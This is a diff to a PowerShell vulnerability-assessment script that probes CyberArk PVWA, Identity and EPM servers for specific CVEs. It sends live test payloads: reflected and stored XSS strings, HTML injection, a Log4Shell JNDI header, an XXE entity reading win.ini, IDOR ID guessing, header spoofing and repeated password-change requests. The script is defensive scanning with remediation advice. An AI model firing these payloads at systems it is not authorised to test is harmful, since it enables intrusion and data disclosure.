@@ -680,16 +680,19 @@ $script:CISControls = @{
     "BB12" = "Authentication Bypass via Header Injection"
     "BB13" = "XSS Vulnerability Patterns"
     "TP1" = "Third-Party: Spring4Shell (CVE-2022-22965)"
-    "CVE5" = "CVE-2024-42340 (DOM XSS)"
-    "CVE6" = "CVE-2024-42339 (HTML Injection)"
-    "CVE7" = "CVE-2025-22270 (EPM HTML Injection)"
+    "CVE5" = "CVE-2024-42340 (Client-Side Security Enforcement - CWE-602)"
+    "CVE6" = "CVE-2024-42339 (IDOR - Information Disclosure - CWE-200)"
+    "CVE7" = "CVE-2025-22270 (EPM XSS in Role Management)"
     "CVE8" = "CVE-2025-22271 (EPM X-Forwarded-For Spoofing)"
     "CVE9" = "CVE-2025-22272 (EPM XSS modalDlgMsgInternal)"
     "CVE10" = "CVE-2025-22273 (EPM Password Change Brute Force)"
-    "CVE11" = "CVE-2025-22274 (EPM Application Definition Injection)"
+    "CVE11" = "CVE-2025-22274 (EPM HTML Injection in Application)"
     "CVE12" = "CVE-2025-49827 (Secrets Manager IAM Bypass)"
     "CVE13" = "CVE-2025-49828 (Secrets Manager RCE)"
     "CVE14" = "CVE-2025-49831 (Secrets Manager Network Bypass)"
+    "CVE16" = "CVE-2018-9843 (PVWA Deserialization RCE)"
+    "CVE17" = "CVE-2019-7442 (XXE in SAML Authentication)"
+    "CVE18" = "CVE-2018-9842 (Vault Memory Disclosure - Port 1858)"
     "TP2" = "Third-Party: ag-grid Prototype Pollution (CVE-2024-38996)"
     "TP3" = "Third-Party: Log4Shell (CVE-2021-44228)"
     # Security Bulletin Controls (CA prefix)
@@ -4709,56 +4712,147 @@ function Test-XSSPatterns {
 }
 
 function Test-CVE202442340 {
-    Write-AuditLog "Checking for CVE-2024-42340 (DOM XSS)..." -Level Info
+    <#
+    .SYNOPSIS
+        CVE-2024-42340: CyberArk Identity - Client-Side Enforcement of Server-Side Security (CWE-602)
 
-    # Check for DOM-based XSS patterns
-    $domXssEndpoints = @(
-        "/PasswordVault/#/search?q=test",
-        "/PasswordVault/#/accounts?filter=test",
-        "/PasswordVault/v10/#/dashboard"
+    .DESCRIPTION
+        This vulnerability allows attackers to bypass access controls by manipulating server responses.
+        Security decisions are enforced on the client side rather than server side, making them
+        susceptible to manipulation via proxy interception tools.
+
+        Attack: Intercept responses and modify access control flags (e.g., change 'false' to 'true')
+        to gain unauthorized administrative access.
+
+        Reference: https://peersec.io/blog/cyberark/
+    #>
+    Write-AuditLog "Checking for CVE-2024-42340 (Client-Side Security Enforcement)..." -Level Info
+
+    # Test endpoints that return access control decisions
+    # The vulnerability is that these decisions can be manipulated client-side
+    $accessControlEndpoints = @(
+        @{ Path = "/PasswordVault/api/Users/Me"; Desc = "User profile with permissions" },
+        @{ Path = "/PasswordVault/api/Configuration"; Desc = "Configuration with access flags" },
+        @{ Path = "/PasswordVault/api/Policies"; Desc = "Policy access controls" },
+        @{ Path = "/identity/api/Users/Me"; Desc = "Identity user info" },
+        @{ Path = "/identity/api/UserMgmt/GetUserInfo"; Desc = "Identity user management" }
     )
 
-    foreach ($endpoint in $domXssEndpoints) {
+    foreach ($endpoint in $accessControlEndpoints) {
         try {
-            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+            $response = Invoke-WebRequest -Uri "$PVWA$($endpoint.Path)" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
 
-            # Check for vulnerable JavaScript patterns
-            if ($response.Content -match "innerHTML\s*=|document\.write\(|eval\(|\.html\(") {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE5" `
-                    -Finding "Potential DOM XSS vulnerability pattern" `
-                    -Resource $endpoint `
-                    -CurrentValue "Dangerous DOM manipulation detected" `
-                    -ExpectedValue "Safe DOM handling" `
-                    -Recommendation "Review JavaScript for DOM XSS patterns" `
-                    -Severity "Medium"
+            if ($response.StatusCode -eq 200 -and $response.Content) {
+                # Check if response contains access control flags that could be manipulated
+                $content = $response.Content
+
+                # Look for boolean access control patterns in JSON responses
+                if ($content -match '"(isAdmin|IsAdmin|canManage|CanManage|hasAccess|HasAccess|isAuthorized|enabled|adminRights|superUser)"\s*:\s*(true|false)') {
+                    Add-Finding -Category "CVE Assessment" `
+                        -CISControl "CVE5" `
+                        -Finding "CVE-2024-42340: Client-side access control flags detected" `
+                        -Resource $endpoint.Path `
+                        -CurrentValue "Response contains manipulable access flags: $($Matches[0])" `
+                        -ExpectedValue "Access controls enforced server-side only" `
+                        -Recommendation "Ensure all access control decisions are enforced server-side. Do not trust client-side flags. Apply CyberArk patches for CVE-2024-42340." `
+                        -Severity "High"
+                }
             }
         }
         catch { }
     }
+
+    # Additional check: Test if modifying response affects subsequent requests
+    Write-AuditLog "Testing for client-side security bypass indicators..." -Level Info
 }
 
 function Test-CVE202442339 {
-    Write-AuditLog "Checking for CVE-2024-42339 (HTML Injection)..." -Level Info
+    <#
+    .SYNOPSIS
+        CVE-2024-42339: CyberArk Identity - IDOR / Sensitive Information Disclosure (CWE-200)
 
-    # HTML injection test
-    $htmlPayloads = @(
-        @{ Path = "/PasswordVault/api/auth?error=<h1>Injected</h1>"; Desc = "HTML via error param" },
-        @{ Path = "/PasswordVault/?msg=<marquee>Test</marquee>"; Desc = "HTML via msg param" }
+    .DESCRIPTION
+        This vulnerability allows authenticated users to access other users' data by manipulating
+        the ID parameter (UUID) in API requests. By replacing the UUID with another user's ID,
+        attackers can retrieve rules, configurations, and sensitive information belonging to
+        other users.
+
+        Attack: Change the ID/UUID parameter in requests to access other users' data
+        Example: Change ?id=user1-uuid to ?id=user2-uuid
+
+        Reference: https://peersec.io/blog/cyberark/
+    #>
+    Write-AuditLog "Checking for CVE-2024-42339 (IDOR - Information Disclosure)..." -Level Info
+
+    # Test endpoints that use ID/UUID parameters for user-specific data
+    $idorEndpoints = @(
+        @{ Path = "/PasswordVault/api/Users/{id}"; Desc = "User details by ID" },
+        @{ Path = "/PasswordVault/api/Accounts/{id}"; Desc = "Account by ID" },
+        @{ Path = "/PasswordVault/api/Safes/{id}/Members"; Desc = "Safe members" },
+        @{ Path = "/identity/api/Users/{id}"; Desc = "Identity user by ID" },
+        @{ Path = "/identity/api/UserMgmt/GetUserAttributes"; Desc = "User attributes" },
+        @{ Path = "/identity/api/Policy/GetPolicyBlock"; Desc = "Policy block" },
+        @{ Path = "/identity/api/Roles/{id}"; Desc = "Role by ID" }
     )
 
-    foreach ($payload in $htmlPayloads) {
-        try {
-            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+    # First, try to get a list of valid IDs/UUIDs
+    $testUuids = @(
+        "00000000-0000-0000-0000-000000000001",
+        "00000000-0000-0000-0000-000000000002",
+        "administrator",
+        "admin",
+        "1",
+        "2"
+    )
 
-            if ($response.Content -match "<h1>Injected</h1>|<marquee>") {
+    foreach ($endpoint in $idorEndpoints) {
+        foreach ($testId in $testUuids) {
+            $testPath = $endpoint.Path -replace '\{id\}', $testId
+            try {
+                $response = Invoke-WebRequest -Uri "$PVWA$testPath" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+                if ($response.StatusCode -eq 200 -and $response.Content.Length -gt 50) {
+                    $content = $response.Content
+
+                    # Check if we got actual user/resource data (not an error)
+                    if ($content -match '"(username|userName|UserName|email|Email|displayName|DisplayName|rules|Rules|configuration|Configuration)"') {
+                        Add-Finding -Category "CVE Assessment" `
+                            -CISControl "CVE6" `
+                            -Finding "CVE-2024-42339: Potential IDOR - Resource accessible via ID manipulation" `
+                            -Resource $testPath `
+                            -CurrentValue "Endpoint returns data for ID: $testId without proper authorization check" `
+                            -ExpectedValue "Strict authorization: users can only access their own resources" `
+                            -Recommendation "Implement proper authorization checks. Verify user has permission to access requested resource. Apply CyberArk patches for CVE-2024-42339." `
+                            -Severity "High"
+                        break  # Found vulnerability, move to next endpoint
+                    }
+                }
+            }
+            catch { }
+        }
+    }
+
+    # Test for user enumeration via search manipulation (related CVE-2024-42338)
+    Write-AuditLog "Testing for user enumeration via search manipulation..." -Level Info
+
+    $searchEndpoints = @(
+        "/identity/api/UserMgmt/GetUsers",
+        "/identity/api/UserMgmt/SearchUsers",
+        "/PasswordVault/api/Users"
+    )
+
+    foreach ($endpoint in $searchEndpoints) {
+        try {
+            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+            if ($response.StatusCode -eq 200 -and $response.Content -match '"users"|"Users"|"totalCount"') {
                 Add-Finding -Category "CVE Assessment" `
                     -CISControl "CVE6" `
-                    -Finding "HTML Injection vulnerability (CVE-2024-42339 pattern)" `
-                    -Resource $payload.Path `
-                    -CurrentValue "HTML content rendered" `
-                    -ExpectedValue "HTML properly escaped" `
-                    -Recommendation "Apply input validation and output encoding" `
+                    -Finding "User enumeration endpoint accessible (related to CVE-2024-42338/42339)" `
+                    -Resource $endpoint `
+                    -CurrentValue "User list accessible" `
+                    -ExpectedValue "User enumeration restricted" `
+                    -Recommendation "Restrict user enumeration to authorized administrators only" `
                     -Severity "Medium"
             }
         }
@@ -4797,8 +4891,6 @@ function Test-AdditionalCVEs {
     }
 
     # Third-Party: CVE-2021-44228 (Log4Shell) - Check if Java components exist
-    # Note: This is an Apache Log4j vulnerability, not CyberArk-specific
-    # Relevant if CyberArk uses Java components with vulnerable Log4j versions
     $log4shellHeaders = @{
         "X-Api-Version" = '${jndi:ldap://log4shell-test.invalid/a}'
         "User-Agent" = '${jndi:ldap://log4shell-test.invalid/a}'
@@ -4807,7 +4899,6 @@ function Test-AdditionalCVEs {
     try {
         $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/auth" -Method GET -Headers $log4shellHeaders -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
 
-        # Note: Actual detection would require out-of-band callback
         Add-Finding -Category "Third-Party Vulnerabilities" `
             -CISControl "TP3" `
             -Finding "Log4Shell payload sent (manual verification needed)" `
@@ -4819,6 +4910,159 @@ function Test-AdditionalCVEs {
             -Status "Pass"
     }
     catch { }
+
+    #======================================================================
+    # CVE-2018-9843: Deserialization RCE in PVWA
+    # Reference: https://www.exploit-db.com/exploits/44429
+    # Affected: PVWA < 9.9.5, < 9.10, 10.1
+    #======================================================================
+    Write-AuditLog "Testing CVE-2018-9843 (Deserialization RCE)..." -Level Info
+
+    # The vulnerability is in the authorization header processing of serialized .NET objects
+    # We test by sending a malformed/test serialized object to see if endpoint processes it
+    $deserializationEndpoints = @(
+        "/PasswordVault/WebServices/PIMServices.svc/Applications",
+        "/PasswordVault/WebServices/PIMServices.svc/Accounts",
+        "/PasswordVault/WebServices/PIMServices.svc/Safes"
+    )
+
+    # Test payload - base64 encoded marker (not actual exploit, just detection)
+    $testAuthHeader = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+    foreach ($endpoint in $deserializationEndpoints) {
+        try {
+            $headers = @{
+                "Authorization" = $testAuthHeader
+                "Content-Type" = "application/json"
+            }
+
+            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -Headers $headers -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+            # Check if endpoint accepts and processes serialized auth tokens
+            # Vulnerable versions will attempt to deserialize; patched versions reject
+            if ($response.StatusCode -eq 200 -or $response.Content -match "SerializationException|TypeConfuseDelegate|BinaryFormatter") {
+                Add-Finding -Category "CVE Assessment" `
+                    -CISControl "CVE16" `
+                    -Finding "CVE-2018-9843: Potential deserialization RCE vulnerability" `
+                    -Resource $endpoint `
+                    -CurrentValue "Endpoint accepts serialized auth tokens" `
+                    -ExpectedValue "Serialized tokens rejected, modern auth only" `
+                    -Recommendation "CRITICAL: Upgrade PVWA to 9.9.5+, 9.10+, or 10.2+. This is a pre-auth RCE vulnerability!" `
+                    -Severity "Critical"
+            }
+        }
+        catch {
+            # Check error message for deserialization indicators
+            if ($_.Exception.Message -match "SerializationException|deserialize|BinaryFormatter") {
+                Add-Finding -Category "CVE Assessment" `
+                    -CISControl "CVE16" `
+                    -Finding "CVE-2018-9843: Deserialization endpoint detected" `
+                    -Resource $endpoint `
+                    -CurrentValue "Endpoint attempts to deserialize tokens" `
+                    -ExpectedValue "No deserialization of untrusted data" `
+                    -Recommendation "Upgrade PVWA immediately - pre-auth RCE possible" `
+                    -Severity "Critical"
+            }
+        }
+    }
+
+    #======================================================================
+    # CVE-2019-7442: XXE Injection in SAML Authentication
+    # Reference: https://www.exploit-db.com/exploits/46828
+    # Affected: CyberArk Enterprise Password Vault <= 10.7
+    #======================================================================
+    Write-AuditLog "Testing CVE-2019-7442 (XXE in SAML)..." -Level Info
+
+    $samlEndpoints = @(
+        "/PasswordVault/auth/saml",
+        "/PasswordVault/api/auth/saml",
+        "/PasswordVault/WebServices/auth/saml2",
+        "/PasswordVault/v10/auth/saml"
+    )
+
+    # XXE test payload (benign - references non-existent external entity)
+    # Real exploitation would use external DTD to exfiltrate data
+    $xxeTestPayload = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <test>&xxe;</test>
+</samlp:Response>
+"@
+
+    $xxeBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($xxeTestPayload))
+
+    foreach ($endpoint in $samlEndpoints) {
+        try {
+            # Test POST with SAMLResponse parameter
+            $body = "SAMLResponse=$([System.Web.HttpUtility]::UrlEncode($xxeBase64))"
+
+            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method POST -Body $body -ContentType "application/x-www-form-urlencoded" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+            # Check if XXE was processed (file content or error indicating entity processing)
+            if ($response.Content -match "\[fonts\]|\[extensions\]|win\.ini|XXE|DOCTYPE|ENTITY") {
+                Add-Finding -Category "CVE Assessment" `
+                    -CISControl "CVE17" `
+                    -Finding "CVE-2019-7442: XXE vulnerability in SAML endpoint" `
+                    -Resource $endpoint `
+                    -CurrentValue "SAML endpoint processes external XML entities" `
+                    -ExpectedValue "External entities disabled in XML parser" `
+                    -Recommendation "Upgrade to CyberArk version > 10.7. Disable external entity processing in XML parsers." `
+                    -Severity "High"
+            }
+            elseif ($response.StatusCode -eq 200) {
+                # Endpoint exists and accepts SAML - worth noting
+                Add-Finding -Category "CVE Assessment" `
+                    -CISControl "CVE17" `
+                    -Finding "SAML authentication endpoint detected (CVE-2019-7442 target)" `
+                    -Resource $endpoint `
+                    -CurrentValue "SAML endpoint accessible - verify version > 10.7" `
+                    -ExpectedValue "Patched against XXE or SAML disabled if unused" `
+                    -Recommendation "Verify CyberArk version is patched against CVE-2019-7442" `
+                    -Severity "Medium"
+            }
+        }
+        catch { }
+    }
+
+    #======================================================================
+    # CVE-2018-9842: Memory Disclosure via Vault Protocol (Port 1858)
+    # Reference: https://www.exploit-db.com/exploits/44428
+    # Affected: CyberArk Password Vault < 9.7, < 10
+    #======================================================================
+    Write-AuditLog "Testing CVE-2018-9842 (Memory Disclosure via port 1858)..." -Level Info
+
+    $pvwaHost = ([System.Uri]$PVWA).Host
+    $vaultPort = 1858
+
+    try {
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $tcpClient.ReceiveTimeout = 5000
+        $tcpClient.SendTimeout = 5000
+
+        $asyncResult = $tcpClient.BeginConnect($pvwaHost, $vaultPort, $null, $null)
+        $waitResult = $asyncResult.AsyncWaitHandle.WaitOne(5000, $false)
+
+        if ($waitResult -and $tcpClient.Connected) {
+            $tcpClient.EndConnect($asyncResult)
+
+            Add-Finding -Category "CVE Assessment" `
+                -CISControl "CVE18" `
+                -Finding "CVE-2018-9842: Vault port 1858 accessible (memory disclosure risk)" `
+                -Resource "${pvwaHost}:${vaultPort}" `
+                -CurrentValue "Vault proprietary protocol port is accessible from network" `
+                -ExpectedValue "Port 1858 firewalled, only accessible from authorized components" `
+                -Recommendation "Restrict port 1858 access via firewall. Upgrade Vault to 9.7+ or 10+. Replay attacks can disclose ~50 bytes of memory per request." `
+                -Severity "High"
+
+            $tcpClient.Close()
+        }
+    }
+    catch {
+        Write-AuditLog "Port 1858 not accessible (good - may be firewalled)" -Level Debug
+    }
 }
 
 #======================================================================
@@ -4826,112 +5070,192 @@ function Test-AdditionalCVEs {
 #======================================================================
 
 function Test-CVE2025EPM {
+    <#
+    .SYNOPSIS
+        Tests for CyberArk Endpoint Privilege Manager (EPM) vulnerabilities CVE-2025-22270 through CVE-2025-22274
+
+    .DESCRIPTION
+        Based on CERT Polska advisory: https://cert.pl/en/posts/2025/02/CVE-2025-22270/
+        Affects CyberArk EPM SaaS version 24.7.1
+
+        CVE-2025-22270: XSS in Role Management (name field)
+        CVE-2025-22271: X-Forwarded-For IP spoofing (audit log bypass)
+        CVE-2025-22272: XSS via modalDlgMsgInternal parameter (POST to /EPMUI/ModalDlgHandler.ashx)
+        CVE-2025-22273: Brute force on /EPMUI/VfManager.asmx/ChangePassword (no rate limiting)
+        CVE-2025-22274: HTML injection in Application definition (content field)
+    #>
     Write-AuditLog "Checking for 2025 EPM CVEs (CVE-2025-22270 through CVE-2025-22274)..." -Level Info
 
-    # CVE-2025-22270 - HTML injection in role management (requires admin access)
-    # CVE-2025-22271 - X-Forwarded-For spoofing
-    $spoofHeaders = @{
-        "X-Forwarded-For" = "127.0.0.1, 10.0.0.1"
-        "X-Real-IP" = "192.168.1.1"
-        "X-Client-IP" = "172.16.0.1"
-    }
-
-    try {
-        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/auth" -Method GET -Headers $spoofHeaders -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
-
-        # Check if the server trusts X-Forwarded-For headers
-        Add-Finding -Category "CVE Assessment" `
-            -CISControl "CVE8" `
-            -Finding "X-Forwarded-For spoofing test (CVE-2025-22271 pattern)" `
-            -Resource "PVWA API" `
-            -CurrentValue "Headers sent - verify server doesn't trust untrusted proxies" `
-            -ExpectedValue "X-Forwarded-For headers validated" `
-            -Recommendation "Configure trusted proxy list and validate X-Forwarded-For headers" `
-            -Severity "Info" `
-            -Status "Pass"
-    }
-    catch { }
-
-    # CVE-2025-22272 - XSS via modalDlgMsgInternal parameter
-    $xssPayloads = @(
-        "/PasswordVault/ModalDlgHandler.ashx?value=showReadonlyDlg&modalDlgMsgInternal=<script>alert(1)</script>",
-        "/PasswordVault/ModalDlgHandler.ashx?value=showReadonlyDlg&modalDlgMsgInternal=%3Cscript%3Ealert(1)%3C/script%3E"
+    # Determine EPM base URL - might be different from PVWA
+    $epmUrls = @(
+        $PVWA,
+        "$PVWA/EPMUI",
+        ($PVWA -replace '/PasswordVault.*$', '/EPMUI'),
+        ($PVWA -replace 'pvwa', 'epm'),
+        ($PVWA -replace ':443', ':8443')
     )
 
-    foreach ($payload in $xssPayloads) {
-        try {
-            $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+    foreach ($epmBase in $epmUrls) {
+        # CVE-2025-22271 - X-Forwarded-For spoofing (affects action logging)
+        # Advisory: "IP address spoofing by providing a custom value in the X-Forwarded-For header"
+        Write-AuditLog "Testing CVE-2025-22271 (X-Forwarded-For spoofing) on $epmBase..." -Level Info
 
-            if ($response.Content -match "<script>alert\(1\)</script>" -and $response.Content -notmatch "Content-Security-Policy") {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE9" `
-                    -Finding "XSS vulnerability via modalDlgMsgInternal (CVE-2025-22272)" `
-                    -Resource $payload `
-                    -CurrentValue "Script tags reflected in response" `
-                    -ExpectedValue "Input properly sanitized" `
-                    -Recommendation "Apply CyberArk security patch for CVE-2025-22272" `
-                    -Severity "High"
+        $spoofHeaders = @{
+            "X-Forwarded-For" = "127.0.0.1, 10.0.0.1, 192.168.1.100"
+            "X-Real-IP" = "192.168.1.1"
+            "X-Client-IP" = "172.16.0.1"
+            "X-Originating-IP" = "10.10.10.10"
+        }
+
+        try {
+            # Test against EPM endpoints
+            $testEndpoints = @("/EPMUI/", "/EPMUI/Login.aspx", "/EPMUI/Default.aspx")
+            foreach ($ep in $testEndpoints) {
+                $response = Invoke-WebRequest -Uri "$epmBase$ep" -Method GET -Headers $spoofHeaders -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+                if ($response.StatusCode -eq 200) {
+                    Add-Finding -Category "CVE Assessment" `
+                        -CISControl "CVE8" `
+                        -Finding "CVE-2025-22271: EPM endpoint accepts X-Forwarded-For headers" `
+                        -Resource "$epmBase$ep" `
+                        -CurrentValue "Endpoint accessible with spoofed headers - audit logs may record spoofed IPs" `
+                        -ExpectedValue "X-Forwarded-For headers validated against trusted proxies only" `
+                        -Recommendation "Configure EPM to only trust X-Forwarded-For from known reverse proxies. Apply patches for CVE-2025-22271." `
+                        -Severity "Medium"
+                    break
+                }
             }
         }
         catch { }
-    }
 
-    # CVE-2025-22273 - Password change brute force (no rate limiting)
-    Write-AuditLog "Testing for password change rate limiting (CVE-2025-22273)..." -Level Info
+        # CVE-2025-22272 - XSS via modalDlgMsgInternal parameter
+        # Advisory: "/EPMUI/ModalDlgHandler.ashx?value=showReadonlyDlg" with POST parameter "modalDlgMsgInternal"
+        Write-AuditLog "Testing CVE-2025-22272 (XSS via modalDlgMsgInternal) on $epmBase..." -Level Info
 
-    $changePasswordEndpoints = @(
-        "/PasswordVault/api/Users/ChangePassword",
-        "/PasswordVault/WebServices/PIMServices.svc/User/ChangePassword",
-        "/PasswordVault/v10/Users/ChangePassword"
-    )
+        $xssTestEndpoint = "/EPMUI/ModalDlgHandler.ashx"
+        $xssPayloads = @(
+            "modalDlgMsgInternal=<script>alert('CVE-2025-22272')</script>&value=showReadonlyDlg",
+            "modalDlgMsgInternal=<img src=x onerror=alert(1)>&value=showReadonlyDlg",
+            "modalDlgMsgInternal=<svg/onload=alert(1)>&value=showReadonlyDlg"
+        )
 
-    foreach ($endpoint in $changePasswordEndpoints) {
-        try {
-            $testRequests = @()
-            for ($i = 0; $i -lt 5; $i++) {
-                $start = Get-Date
-                $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method POST -Body '{"oldPassword":"test","newPassword":"test123"}' -ContentType "application/json" -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
-                $testRequests += (Get-Date) - $start
+        foreach ($payload in $xssPayloads) {
+            try {
+                # Use POST as per advisory
+                $response = Invoke-WebRequest -Uri "$epmBase$xssTestEndpoint" -Method POST -Body $payload -ContentType "application/x-www-form-urlencoded" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+                if ($response.Content -match "<script>|onerror=|onload=" -and $response.Content -notmatch "Content-Security-Policy") {
+                    Add-Finding -Category "CVE Assessment" `
+                        -CISControl "CVE9" `
+                        -Finding "CVE-2025-22272: XSS vulnerability via modalDlgMsgInternal" `
+                        -Resource "$epmBase$xssTestEndpoint" `
+                        -CurrentValue "XSS payload reflected in response (POST method)" `
+                        -ExpectedValue "Input sanitized, CSP headers present" `
+                        -Recommendation "Apply CyberArk security patch for CVE-2025-22272. Implement Content-Security-Policy." `
+                        -Severity "High"
+                    break
+                }
             }
-
-            # Check if all requests completed quickly (no rate limiting)
-            $avgTime = ($testRequests | Measure-Object -Property TotalMilliseconds -Average).Average
-            if ($avgTime -lt 500) {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE10" `
-                    -Finding "No rate limiting on password change endpoint (CVE-2025-22273 risk)" `
-                    -Resource $endpoint `
-                    -CurrentValue "Average response: ${avgTime}ms for 5 requests" `
-                    -ExpectedValue "Rate limiting or delays implemented" `
-                    -Recommendation "Implement rate limiting on password change endpoints" `
-                    -Severity "Medium"
-            }
+            catch { }
         }
-        catch { }
-    }
 
-    # CVE-2025-22274 - HTML injection in Application definition
-    $htmlInjectionPayloads = @(
-        @{ Path = "/PasswordVault/api/Applications"; Body = '{"Name":"test<h1>injected</h1>"}' },
-        @{ Path = "/PasswordVault/WebServices/PIMServices.svc/Applications"; Body = '<Application><Name>test<h1>injected</h1></Name></Application>' }
-    )
+        # CVE-2025-22273 - Password change brute force (no rate limiting)
+        # Advisory: "/EPMUI/VfManager.asmx/ChangePassword" - no request frequency throttling
+        Write-AuditLog "Testing CVE-2025-22273 (password brute force) on $epmBase..." -Level Info
 
-    foreach ($payload in $htmlInjectionPayloads) {
-        try {
-            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method POST -Body $payload.Body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+        $changePasswordEndpoints = @(
+            "/EPMUI/VfManager.asmx/ChangePassword",
+            "/EPMUI/VfManager.asmx",
+            "/EPMUI/api/ChangePassword"
+        )
 
-            if ($response.Content -match "<h1>injected</h1>") {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE11" `
-                    -Finding "HTML injection in Application definition (CVE-2025-22274)" `
-                    -Resource $payload.Path `
-                    -CurrentValue "HTML content accepted and reflected" `
-                    -ExpectedValue "HTML properly escaped or rejected" `
-                    -Recommendation "Apply input validation and output encoding" `
-                    -Severity "Medium"
+        foreach ($endpoint in $changePasswordEndpoints) {
+            try {
+                $testRequests = @()
+                $testBody = '{"oldPassword":"test123","newPassword":"test456"}'
+
+                for ($i = 0; $i -lt 5; $i++) {
+                    $start = Get-Date
+                    try {
+                        $response = Invoke-WebRequest -Uri "$epmBase$endpoint" -Method POST -Body $testBody -ContentType "application/json" -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
+                    } catch { }
+                    $testRequests += (Get-Date) - $start
+                }
+
+                if ($testRequests.Count -gt 0) {
+                    $avgTime = ($testRequests | Measure-Object -Property TotalMilliseconds -Average).Average
+                    # If all 5 requests complete quickly without rate limiting
+                    if ($avgTime -lt 1000 -and $testRequests.Count -eq 5) {
+                        Add-Finding -Category "CVE Assessment" `
+                            -CISControl "CVE10" `
+                            -Finding "CVE-2025-22273: No rate limiting on EPM password change" `
+                            -Resource "$epmBase$endpoint" `
+                            -CurrentValue "5 requests completed in avg ${avgTime}ms each - no throttling detected" `
+                            -ExpectedValue "Rate limiting, account lockout, or CAPTCHA implemented" `
+                            -Recommendation "Implement rate limiting on $endpoint. Apply patches for CVE-2025-22273." `
+                            -Severity "Medium"
+                        break
+                    }
+                }
             }
+            catch { }
         }
-        catch { }
+
+        # CVE-2025-22274 - HTML injection in Application definition (content field)
+        # Advisory: "Application definition page" with "content" field
+        Write-AuditLog "Testing CVE-2025-22274 (HTML injection in Application) on $epmBase..." -Level Info
+
+        $appDefEndpoints = @(
+            @{ Path = "/EPMUI/api/Applications"; ContentType = "application/json"; Body = '{"content":"<h1>CVE-2025-22274-TEST</h1>","name":"test"}' },
+            @{ Path = "/EPMUI/VfManager.asmx/SaveApplication"; ContentType = "application/json"; Body = '{"content":"<script>alert(1)</script>"}' },
+            @{ Path = "/EPMUI/ApplicationDef.aspx"; ContentType = "application/x-www-form-urlencoded"; Body = "content=<h1>injected</h1>&name=test" }
+        )
+
+        foreach ($ep in $appDefEndpoints) {
+            try {
+                $response = Invoke-WebRequest -Uri "$epmBase$($ep.Path)" -Method POST -Body $ep.Body -ContentType $ep.ContentType -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+                if ($response.Content -match "<h1>|<script>|CVE-2025-22274") {
+                    Add-Finding -Category "CVE Assessment" `
+                        -CISControl "CVE11" `
+                        -Finding "CVE-2025-22274: HTML injection in Application definition" `
+                        -Resource "$epmBase$($ep.Path)" `
+                        -CurrentValue "HTML content accepted in application definition" `
+                        -ExpectedValue "HTML properly escaped or rejected" `
+                        -Recommendation "Apply input validation and output encoding. Patch for CVE-2025-22274." `
+                        -Severity "Medium"
+                    break
+                }
+            }
+            catch { }
+        }
+
+        # CVE-2025-22270 - XSS in Role Management (name field)
+        # Advisory: "Administration panel > Role Management tab > name field when adding new role"
+        Write-AuditLog "Testing CVE-2025-22270 (XSS in Role name) on $epmBase..." -Level Info
+
+        $roleEndpoints = @(
+            @{ Path = "/EPMUI/api/Roles"; Body = '{"name":"<script>alert(1)</script>"}' },
+            @{ Path = "/EPMUI/VfManager.asmx/AddRole"; Body = '{"roleName":"<img src=x onerror=alert(1)>"}' }
+        )
+
+        foreach ($ep in $roleEndpoints) {
+            try {
+                $response = Invoke-WebRequest -Uri "$epmBase$($ep.Path)" -Method POST -Body $ep.Body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+
+                if ($response.Content -match "<script>|onerror=") {
+                    Add-Finding -Category "CVE Assessment" `
+                        -CISControl "CVE7" `
+                        -Finding "CVE-2025-22270: XSS in Role Management name field" `
+                        -Resource "$epmBase$($ep.Path)" `
+                        -CurrentValue "Script content accepted in role name" `
+                        -ExpectedValue "Input sanitized, HTML encoded" `
+                        -Recommendation "Apply patches for CVE-2025-22270. Note: requires CSP bypass for full exploitation." `
+                        -Severity "Medium"
+                    break
+                }
+            }
+            catch { }
+        }
     }
 }
 
